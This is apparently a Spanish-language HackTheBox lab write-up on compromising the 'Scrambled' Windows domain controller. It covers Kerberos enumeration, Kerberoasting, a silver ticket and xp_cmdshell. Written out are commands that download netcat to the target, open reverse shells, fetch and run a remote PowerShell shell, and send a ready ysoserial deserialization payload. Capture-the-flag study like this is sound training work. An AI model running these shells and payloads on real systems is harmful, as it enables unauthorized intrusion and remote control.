---
layout      : post
title       : "Scrambled - HackTheBox"
author      : elc4br4
image       : assets/images/HTB/Scrambled-HackTheBox/Scrambled.webp
category    : [ htb ]
tags        : [ Windows ]
---

Estamos ante una máquina Windows de nivel MEDIO bastante compleja, tendremos que enumerar utilizando una gran cantidad de herramientas Impacket. Habilitaremos _xp_cmdshell en la base de datos sql para ejecutar comandos y obtener una shell inversa. Nos migraremos a otro usuario tars encontrar credenciales en la base de datos y escalaremos privilegios a través de una deserialización .NET usando la herramienta `ysoserial`

![](/assets/images/HTB/Scrambled-HackTheBox/scrambled2.webp)

[![HTBadge](https://www.hackthebox.eu/badge/image/533771)](https://www.hackthebox.com/home/users/profile/533771)

![](/assets/images/HTB/Scrambled-HackTheBox/scrambled-rating.webp)


***


**Un pequeño INDICE**

1. [Reconocimiento](#reconocimiento).
    * [Reconocimiento de Puertos](#recon-nmap).
2. [Enumeración](#enumeración).
    * [Enumeración SMB](#enum-smb).
3. [Kerberos](#kerberos).
    * [Enumeración Usuarios](#enum-usuarios).
    * [Fuerza Bruta Usuarios](#brute-users).
4. [Silver Ticket](#silver).
5. [SQL](#sql).
    * [Reverse Shell](#rev-shell).
6. [Escalada de Privilegios Horizontal - Usuario miscsvc](#privesc).
7. [ipforwarding](#ipforwarding).
8. [Escalada de Privilegios Vertical - Usuario Administrador](#privesc2).
    * [ScrambleClient.exe](#scrambled)


***


# Reconocimiento [#](reconocimiento) {#reconocimiento}

***

## Reconocimiento de Puertos [🔍](#recon-nmap) {#recon-nmap}

Como de cosumbre antes de comenzar a escanear los puertos de la máquina lanzo la utilidad WhichSystem.py para detectar el sistema operativo de la máquina víctima.

![](/assets/images/HTB/Scrambled-HackTheBox/whichsystem.webp)

Estamos ante una máquina Windows, y ahora que lo sabemos ya procedo a escanear puertos.

```nmap
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
4411/tcp  open  found
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49700/tcp open  unknown
49704/tcp open  unknown
50852/tcp open  unknown
```

Tenemos un listado de puertos muy amplio, pero aún necesito más información de los mismos, asique laznzo un escaneo más avanzado.

Al ser tantos puertos uso la utilidad extractPorts para copiarlos al portapapeles.

![](/assets/images/HTB/Scrambled-HackTheBox/extractports.webp)

Una vez copiados lanzo el escaneo de nmap.

```nmap
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Scramble Corp Intranet
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-10-08 00:45:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
|_ssl-date: 2022-10-08T00:48:43+00:00; 0s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
|_ssl-date: 2022-10-08T00:48:43+00:00; 0s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2022-10-08T00:48:43+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-10-08T00:28:20
|_Not valid after:  2052-10-08T00:28:20
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-10-08T00:48:43+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-10-08T00:48:43+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
4411/tcp  open  found?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
50852/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4411-TCP:V=7.92%I=7%D=10/8%Time=6340C830%P=x86_64-pc-linux-gnu%r(NU
SF:LL,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GenericLines,1D,"SCRAMBLEC
SF:ORP_ORDERS_V1\.0\.3;\r\n")%r(GetRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.
SF:3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(HTTPOptions,35,"SCRAMBLECORP_ORDER
SF:S_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RTSPRequest,35,"SCRAMBLEC
SF:ORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RPCCheck,1D,"SCR
SF:AMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSVersionBindReqTCP,1D,"SCRAMBLECOR
SF:P_ORDERS_V1\.0\.3;\r\n")%r(DNSStatusRequestTCP,1D,"SCRAMBLECORP_ORDERS_
SF:V1\.0\.3;\r\n")%r(Help,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNO
SF:WN_COMMAND;\r\n")%r(SSLSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n
SF:")%r(TerminalServerCookie,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TLS
SF:SessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Kerberos,1D,"SCRAM
SF:BLECORP_ORDERS_V1\.0\.3;\r\n")%r(SMBProgNeg,1D,"SCRAMBLECORP_ORDERS_V1\
SF:.0\.3;\r\n")%r(X11Probe,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(FourO
SF:hFourRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND
SF:;\r\n")%r(LPDString,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_
SF:COMMAND;\r\n")%r(LDAPSearchReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%
SF:r(LDAPBindReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SIPOptions,35,"
SF:SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(LANDesk
SF:-RC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TerminalServer,1D,"SCRAMB
SF:LECORP_ORDERS_V1\.0\.3;\r\n")%r(NCP,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r
SF:\n")%r(NotesRPC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(JavaRMI,1D,"S
SF:CRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(WMSRequest,1D,"SCRAMBLECORP_ORDERS
SF:_V1\.0\.3;\r\n")%r(oracle-tns,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r
SF:(ms-sql-s,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(afp,1D,"SCRAMBLECOR
SF:P_ORDERS_V1\.0\.3;\r\n")%r(giop,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n");
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-10-08T00:48:06
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| ms-sql-info: 
|   10.10.11.168:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
```
Tenemos cositas interesantes...

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 88     | Kerberos | Microsoft Windows Kerberos |
| 389    | LDAP     | Microsoft Windows Active Directory LDAP |
| 1433   | ms-sql-s | Microsoft SQL Server 2019 |
| 4411   | ¿SERVIDOR WEB? | SCRAMBLECORP |

> Dominio scrm.local y dc1.scrm.local que nos dice que estamos ante un DC.

Lo añadimos al etc/hosts.

# Enumeración [#](enumeración) {#enumeración}

***

## Enumeración SMB [🔢](#enum-smb) {#enum-smb}

Para comenzar lanzo crackmapexec para enumerar un poco el SMB y saber a que me enfrento.

```smb
❯ crackmapexec smb 10.10.11.168
SMB         10.10.11.168    445    NONE             [*]  x64 (name:) (domain:) (signing:True) (SMBv1:False)
```

No nos detecta ni el nombre, ni el dominio, el SMB esta firmado... pero no detecta nada

Asique voy a probar a listar recursos con smbclient usando una null session ya que no dispongo de credenciales.

```SMB
❯ smbclient -L 10.10.11.168 -N
session setup failed: NT_STATUS_NOT_SUPPORTED
```
Pero nos arroja el error **NT_STATUS_NOT_SUPPORTED** que no es que el acceso sea denegado, sino que no está soportado... algo bastante extraño asique voy a buscar información al respecto.

[https://pw999.wordpress.com/2018/01/04/session-setup-failed-nt_status_not_supported/](https://pw999.wordpress.com/2018/01/04/session-setup-failed-nt_status_not_supported/)

> Este error es debido a que el NTLM está restringido en la máquina víctima.

Por lo tanto algunos ataques que podríamos efectuar en principio ya no podríamos efectuarlos, ya que el NTLM está restringido.

A continuación, ya que no puedo enumerar smb ni tengo ningún hilo del que tirar, voy a tratar de obtener usuarios a través de Kerberos. 

# Kerberos [#](kerberos) {#kerberos}

***

## Enumeración Usuarios [🕵️‍♂️](#enum-usuarios) {#enum-usuarios}

Con la herramienta kerbrute puedo tratar de buscar usuarios válidos usando una lista de palabras.

Usaré las listas de usuarios de este repositorio, ya que está enfocado para la enumeración de usuarios a través de Kerberos.

[https://github.com/attackdebris/kerberos_enum_userlists](https://github.com/attackdebris/kerberos_enum_userlists)

A través de kerbrute enumeramos usuarios.

![](/assets/images/HTB/Scrambled-HackTheBox/kerbrute.webp)

❯ ./kerbrute userenum -d scrm.local --dc 10.10.11.168 /opt/kerberos_enum_userlists/A-ZSurnames.txt

| Parámetro | Descripción| 
| :-------- | :------- | 
|-d         | Dominio  |        
| -dc-ip    | ip del dc|   
|/opt/kerberos_enum_userlists/A-ZSurnames.txt | ruta del diccionario de usuarios |

Obtenemos varios usuarios, por lo tanto teniendo usuarios podríamos desplegar el ataque ASREPRoast para intentar conseguir el hash NTLM de alguno de los usuarios, asique me copio los usuarios en un archivo de texto antes de proceder al ataque ASREPRoast.

![](/assets/images/HTB/Scrambled-HackTheBox/users.webp)

Y lanzamos el ataque ASREPRoast con la utilidad GETNPUsers.py de la suite Impacket.

![](/assets/images/HTB/Scrambled-HackTheBox/ASREPRoast.webp)

> `python3 GetNPUsers.py -usersfile /home/elc4br4/HTB/Scramble/users -dc-ip 10.10.11.168 scrm.local/`

| Parámetro | Descripción| 
| :-------- | :------- | 
|-usersfile | Hace referencia al archivo de texto que contiene los usuarios |        
| -dc-ip    | ip del dc |        

Pero no ha habido suerte, no nos arroja ningún hash, y esto es debido a lo que vimos anteriormente de que el NTLM estaba restringido.

Pero a través de kerbrute también podemos hacer fuerza bruta a las contraseñas de cada uno de los usuarios que hemos encontrado.

## Fuerza Bruta Usuarios [🏋️‍♂️](#brute-users) {#brute-users}

En este caso antes de probar con un diccionario grande como es el caso de rockyou.txt voy a probar como diccionario de contraseñas el propio archivo de usuarios, por si se estuviera reutilizando un usuario como contraseña.

Voy probando con cada uno de los usuarios y encuentro lo siguiente:

![](/assets/images/HTB/Scrambled-HackTheBox/kerbrute2.webp)

> ./kerbrute bruteuser --dc 10.10.11.168 -d scrm.local ./users ksimpson

Tenemos una contraseña válida ksimpson:ksimpson 

LLegados a este punto que ya tenemos credenciales válidas podríamos intentar solicitar un ticket (TGT - Ticket Granting Ticket) para poder autenticarnos por Kerberos.

![](/assets/images/HTB/Scrambled-HackTheBox/TGT.webp)

Una vez lanzamos el comando conseguimos el ticket, y con este ticket podríamos conseguir el hash de algún usuario.

Lo hago a través de Kerberos ya que tenemos el NTLM restringido.

![](/assets/images/HTB/Scrambled-HackTheBox/error.webp)

Lo lanzamos pero me arroja un error, buscando en internet encuentro lo siguiente.

![](/assets/images/HTB/Scrambled-HackTheBox/error2.webp)

Debemos editar la línea 255 del script GetUsersSPNs.py

![](/assets/images/HTB/Scrambled-HackTheBox/python3.webp)

Una vez editado el archivo lo lanzamos de nuevo de la misma forma que anteriormente.

![](/assets/images/HTB/Scrambled-HackTheBox/hash.webp)

Y obtenemos un hash (krb5tgs) del usuario sqlsvc que parece ser un usuario del servidor SQL.

De esta forma podemos copiarnos el hash e intentar crackearlo con john o hashcat.

Yo lo crackearé con hashcat.

> hahcat -m 13100 -a 0 hash /usr/share/wordlists/rockyou.txt

![](/assets/images/HTB/Scrambled-HackTheBox/hashcat.webp)

Recopilo los datos que tenemos de momento.

> ksimpson:ksimpson
> sqlsvc:Pegasus60

Intento loguearme en el servidor sql a través de la herramienta mssqlclient.py generando un hash NTLM a partir de la contraseña encontrada.

![](/assets/images/HTB/Scrambled-HackTheBox/ntlm.webp)

De forma que intento loguearme a través del hash NTLM creado pero no funciona.

![](/assets/images/HTB/Scrambled-HackTheBox/error3.webp)

Este error es debido a la restricción NTLM.

# Silver Ticket [#](silver) {#silver}

De forma que la única opción de loguearse es a través de Kerberos pero claro, necesitamos crear un ticket (Silver Ticket) con toda la información que tenemos al respecto.

![](/assets/images/HTB/Scrambled-HackTheBox/error4.webp)

Me vuelve a arrojar un error, me pide el `domain sid` del dominio.

Para conseguir el domain sid del dominio puedo usar la herramienta secretsdump de la suite impacket.

![](/assets/images/HTB/Scrambled-HackTheBox/secretsdump.webp)

Ahora que ya tenemos el SID del dominio podemos intentar obtener 
el ticket.

`impacket-ticketer -domain scrm.local -spn MSSQLSVC/dc1.scrm local -user-id 500 Administrator -nthash¿? -domain-sid ¿?`

![](/assets/images/HTB/Scrambled-HackTheBox/ticket.webp)

Ahora que ya hemos podido crear el ticket (Silver Ticket), podríamos intentar autenticarnos a sql a través de mssqlclient por Kerberos.

![](/assets/images/HTB/Scrambled-HackTheBox/mssql.webp)

Y ya estamos autenticados en el servidor SQL.


# SQL [#](sql) {#sql}

Pruebo a inspeccionar que hay dentro de la base de datos.

> Listamos las bases de datos

`select name from master.sys.databses`

![](/assets/images/HTB/Scrambled-HackTheBox/sqlcommands1.webp)

Vemos que una de las bases de datos se llama ScrambleHR, es la más llamativa de todas asique accedo a ella.

`use ScrambledHR`

> Listamos las tablas que hay dentro de la base de datos ScrambleHR

`select name from information_schema.tables`

![](/assets/images/HTB/Scrambled-HackTheBox/sqlcommands2.webp)

> Listamos el contenido de la tabla UserImport

`SELECT * from UserImport`

![](/assets/images/HTB/Scrambled-HackTheBox/sqlcommands3.webp)

Y encuentro el usuario miscsvc y la contraseña ScrambledEggs9900

Peroa demás de eso, después de obtener las credenciales lanzo el comando help para ver que utilidades hay en la base de datos y encuentro algo que me alegra el día por completo!!!

![](/assets/images/HTB/Scrambled-HackTheBox/sql1.webp)

Tenemos la opción de habilitar xp_cmdshell que nos permitiría ejecutar comandos en el sistema.

Para el que quiera saber más acerca de esta utilidad:
[https://www.sqlshack.com/use-xp-cmdshell-extended-procedure/](https://www.sqlshack.com/use-xp-cmdshell-extended-procedure/)

Una vez que sabemos que existe esta utilidad pues vamos a activarla y a usarla.

La activamos con el comando xp-cmdshell

![](/assets/images/HTB/Scrambled-HackTheBox/sql2.webp)

Y una vez activado probamos a ejecutar algún comando, en este caso lanzo el comando whoami.

![](/assets/images/HTB/Scrambled-HackTheBox/sql3.webp)

Como podemos ver nos ejecuta el comando y nos devuelve la salida al mismo, asique voy a probar a entablar una reverse shell.


## Reverse Shell  [🔄](#rev-shell) {#rev-shell}

> Lo primero será subir el netcat a la máquina vícitma.

Abro un servidor python3 en mi máquina.

`python3 -m http.server 8080`

Y desde el servidor sql ejecuto el siguiente comandopara descargar el netcat.

`xp_cmdshell curl 10.10.14.2/nc64.exe -o C:\Temp\nc.exe`

![](/assets/images/HTB/Scrambled-HackTheBox/sql4.webp)

> A continuación pongo un oyente de netcat en escucha en el puerto 443.

> Y lanzo el siguiente comando para eejcutar la rev shell desde el servidor sql usando el nc.exe 

En mi máquina atacante:

`nc -lnvp 443`

En el servidor SQL:

`xp_cmdshell C:\Temp\nc.exe -e powershell 10.10.14.2 443`

![](/assets/images/HTB/Scrambled-HackTheBox/sql5.webp)

Y obtenemos la conexión inversa.

![](/assets/images/HTB/Scrambled-HackTheBox/sql6.webp)

Intento leer la flag user.txt pero no puedo, porque estoy logueado como el usuario sqlsvc.

Asique me toca migrarme al usuario miscsvc.

# Escalada de Privilegios Horizontal - Usuario miscsvc [#](privesc) {#privesc}

Usando las credenciales obtenidas intentaré convertirme en el usuario miscsvc.

Podría crear unas credenciales en Pòwershell y después intentar lanzar una rev shell.

> Creo las credenciales

`$password = ConvertTo-SecureString "ScrambledEggs9900" -AsPlainText -Force`

`$creds = New-Object System.Management.Automation.PSCredential("scrm\miscsvc", $password)`

![](/assets/images/HTB/Scrambled-HackTheBox/credenciales.webp)

Después me abro un oyente en netcat en mi máquin atacante.

`nc -lnvp 8888`

Una vez estamos en escucha pruebo a lanzar una rev shell en powershell que he descargado del repositorio de **`Nishang`**

Pero antes debemos editarla.

![](/assets/images/HTB/Scrambled-HackTheBox/reverse.webp)

Una vez editada lanzamos el comando:

[https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

`Invoke-Command -Computer dc1 -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2:8080/Invoke-PowerShellTcp.ps1') } -Credential $creds`

![](/assets/images/HTB/Scrambled-HackTheBox/miscsvc.webp)

Y ya nos hemos podido convertir en el usuario miscsvc, por lo tanto podemos leer la flag de usuario.

![](/assets/images/HTB/Scrambled-HackTheBox/user.webp)

Continuo enumerando un poco la máquina y encuentro un par de recursos compartidos a los que tengo acceso.

![](/assets/images/HTB/Scrambled-HackTheBox/smb.webp)

Asique uso la utilidad smbclient para descargar estos dos archivos y posteriormente analizar el .exe con dnSpy.

Pero en esta ocasión antes de nada, voy a tener que compartir la VPN de HTB con el sistema Windows para poder continuar, a través de la técnica **`IP FORWARDING`**

# IP FORWARDING [#](ipforwarding) {#ipforwarding}

```bash
# ip máquina atacante Linux --> 192.168.213.128 NAT
-------------------------------------------------
-------------------------------------------------
# ip máquina Windows --> 192.168.213.131 NAT
```

Una vez tenemos las ip´s de las máquinas ejecutamos los siguientes comandos:

```bash
# Linux Atacante
sudo echo 1 > /proc/sys/net/ipv4/ip_forward
sudo iptables -A FORWARD -i tun0 -o eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A FORWARD -i eth0 -o tun0 -j ACCEPT
sudo iptables -t nat -A POSTROUTING -s 192.168.213.0/24 -o tun0 -j MASQUERADE 
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
# Windows
route add 10.10.10.0 mask 255.255.254.0 192.168.213.218
```
Una vez realizamos los pasos hacemos ping desde Windows a la máquina víctima 10.10.11.168 y hay respuesta, he convertido la máquina Linux en un router y puedo compartir la vpn con la máquina Windows.

![](/assets/images/HTB/Scrambled-HackTheBox/ping.webp)

# Escalada de Privilegios Vertical - Usuario Administrador [#](privesc2) {#privesc2}

***

## ScrambleClient.exe [💻](#scramabled) {#scrambled}

![](/assets/images/HTB/Scrambled-HackTheBox/smbclient.webp)

Analizando el código encuentro un usuario.

![](/assets/images/HTB/Scrambled-HackTheBox/dnspy1.webp)

Tengo el usuario scrmdev asique pruebo a autenticarme sin contraseña.

![](/assets/images/HTB/Scrambled-HackTheBox/exe1.webp)

Y consigo autenticarme y acceder.

Una vez dentro tenemos lo siguiente.

![](/assets/images/HTB/Scrambled-HackTheBox/exe2.webp)

![](/assets/images/HTB/Scrambled-HackTheBox/exe3.webp)

Debemos habilitar el debugging y crearemos un nuevo order.

![](/assets/images/HTB/Scrambled-HackTheBox/exe4.webp)

![](/assets/images/HTB/Scrambled-HackTheBox/exe5.webp)

Una vez creado cerramos el programa, lo volvemos a abrir, y leemos el archivo debug que se genera y encontramos lo siguiente:

![](/assets/images/HTB/Scrambled-HackTheBox/debug.webp)

Hay data encodeada en base64, asique probaré a decodificar la última cadena.

![](/assets/images/HTB/Scrambled-HackTheBox/decode.webp)

La aplicación envía los datos en formato base64 serializado. Entonces, la aplicación realiza la deserialización de su lado.

> <span style="color:red">Searialización a Base64</span>.

![](/assets/images/HTB/Scrambled-HackTheBox/serializacion.webp)

> <span style="color:red">Desearialización de Base64</span>.

![](/assets/images/HTB/Scrambled-HackTheBox/deserializacion.webp)


Por lo tanto si conseguimos serializar una reverse shell, ponernos en escucha en el puerto donde se ejecuta la herramienta e introducir la data serializada podríamos obtener acceso al sistema como Administrador, ya que la aplicación se ejecuta bajo los permisos del mismo.

Realizaré un ataque de Desearialización .NET, y buscando encuentro este artículo.

[https://vbscrub.com/2020/02/05/net-deserialization-exploits-explained/](https://vbscrub.com/2020/02/05/net-deserialization-exploits-explained/)

Para poder realizar este payload serializado usaré la herramienta ysoserial.net que podemos descargar desde el repositorio de github.

[https://github.com/pwntester/ysoserial.net/releases](https://github.com/pwntester/ysoserial.net/releases)

Una vez descargada, desde powershell o cmd la ejecutaremos para serializar el payload con el siguiente comando.

> C:\Users\W10_CFC\Desktop\Release> <span style="color:red"> ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "C:\Temp\netcat.exe -e powershell 10.10.14.4 443" </span>. 

Y se nos generará serializado.

![](/assets/images/HTB/Scrambled-HackTheBox/serializacion2.webp)

Una vez serializado nos ponemos en escucha en el puerto 443 (que es el que yo he configurado antes de serializar el comando).

![](/assets/images/HTB/Scrambled-HackTheBox/nc.webp)

En otra ventana en el cmd nos podemos en escucha en el puerto 4411 que es donde se ejecuta la herramienta e introducimos la data serializada de la siguiente forma.

Debemos añadir delante de la data: <span style="color:red">UPLOAD_ORDER;dataserializada</span>.

```cmd
# DATA SERIALIZADA
------------------
C:\Users\W10_CFC\Desktop>nc.exe 10.10.11.168 4411
SCRAMBLECORP_ORDERS_V1.0.3;
UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA+AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBMmdVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUVNNlhGUmxiWEJjYm1NdVpYaGxJQzFsSUhCdmQyVnljMmhsYkd3Z01UQXVNVEF1TVRRdU5DQTBORE1pSUZOMFlXNWtZWEprUlhKeWIzSkZibU52WkdsdVp6MGllM2c2VG5Wc2JIMGlJRk4wWVc1a1lYSmtUM1YwY0hWMFJXNWpiMlJwYm1jOUludDRPazUxYkd4OUlpQlZjMlZ5VG1GdFpUMGlJaUJRWVhOemQyOXlaRDBpZTNnNlRuVnNiSDBpSUVSdmJXRnBiajBpSWlCTWIyRmtWWE5sY2xCeWIyWnBiR1U5SWtaaGJITmxJaUJHYVd4bFRtRnRaVDBpWTIxa0lpQXZQZzBLSUNBZ0lDQWdQQzl6WkRwUWNtOWpaWE56TGxOMFlYSjBTVzVtYno0TkNpQWdJQ0E4TDNOa09sQnliMk5sYzNNK0RRb2dJRHd2VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLUEM5UFltcGxZM1JFWVhSaFVISnZkbWxrWlhJK0N3PT0L
```

![](/assets/images/HTB/Scrambled-HackTheBox/nc2.webp)

Le damos ENTER y tenemos la conexión inversa

![](/assets/images/HTB/Scrambled-HackTheBox/admin.webp)

Y ya podemos leer la flag root.txt

![](/assets/images/HTB/Scrambled-HackTheBox/root.webp)

<span style="color:Red">PWNED!!!</span>

![](/assets/images/HTB/Scrambled-HackTheBox/pwned.webp)























































